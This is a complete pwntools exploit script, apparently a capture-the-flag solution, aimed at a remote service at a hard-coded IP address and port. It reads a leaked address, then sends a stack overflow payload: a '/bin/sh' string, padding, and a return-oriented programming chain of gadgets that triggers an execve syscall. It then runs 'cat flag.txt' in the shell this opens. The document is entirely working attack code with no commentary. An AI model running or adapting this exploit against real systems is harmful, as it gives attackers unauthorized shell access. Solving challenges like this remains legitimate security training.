from pwn import *

r = remote("140.113.207.245", 30173)
print(r.recvuntil(b"address ").decode())
addr = r.recvuntil(b"\n").decode()
print(addr)

pop_rdi_pop_rbp_ret = 0x00402188
pop_rsi_ret = 0x004104C2
pop_rdx_ret = 0x00413270
pop_rax_ret = 0x00427F2B
syscall = 0x00401324

payload = b"/bin/sh\x00" + b"a" * 16
payload += p64(pop_rdi_pop_rbp_ret) + p64(int(addr, 16)) + p64(0)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(0x3B)
payload += p64(syscall)

r.sendline(payload)
r.sendline(b"cat flag.txt")
print(r.recv().decode())

r.close()
